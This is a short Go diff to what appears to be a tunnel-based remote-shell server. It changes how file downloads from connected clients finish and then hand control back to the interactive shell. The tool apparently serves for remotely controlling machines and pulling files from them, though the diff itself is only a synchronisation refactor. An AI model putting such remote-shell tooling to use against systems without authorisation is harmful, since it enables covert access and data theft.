@@ -62,7 +62,6 @@ type dlFile struct {
 	maxSize  int
 	curSize  int
 	filename string
-	done     chan bool
 }
 
 func main() {
@@ -242,23 +241,21 @@ func (s *GTServer) handleFile() {
 		}
 		s.file.curSize += n
 		fmt.Fprintf(os.Stdout, "[*] downloading %.4f%%, %dbyte/s\r", float64(s.file.curSize)/float64(s.file.maxSize)*100, n)
-		break
 
 	case TunnelFileEnd:
 		fmt.Fprintln(os.Stdout, "\r")
-		fmt.Println("[*] File download finished")
-		s.file.done <- true
+		fmt.Println("[i*] File download finished")
 		s.file.f.Close()
-		break
+		s.send(s.curOptCltID, TunnelShellData, "")
+
 	case TunnelFileError:
 		fmt.Fprintln(os.Stdout, "\r")
 		fmt.Println("\r[!] download file error")
-		s.file.done <- true
 		if s.file.f != nil {
 			s.file.f.Close()
 		}
+		s.send(s.curOptCltID, TunnelShellData, "")
 
-		break
 	default:
 		break
 	}
@@ -497,11 +494,7 @@ func (s *GTServer) interact(clientID uint8) {
 
 		if len(payload) > 9 && payload[0:8] == "download" {
 			s.file.filename = payload[9:]
-			s.file.done = make(chan bool)
 			s.download(s.file.filename)
-			// block here, wait file download finish
-			<-s.file.done
-			s.send(s.curOptCltID, TunnelShellData, "")
 			continue
 		}
 		go s.send(s.curOptCltID, TunnelShellData, payload)
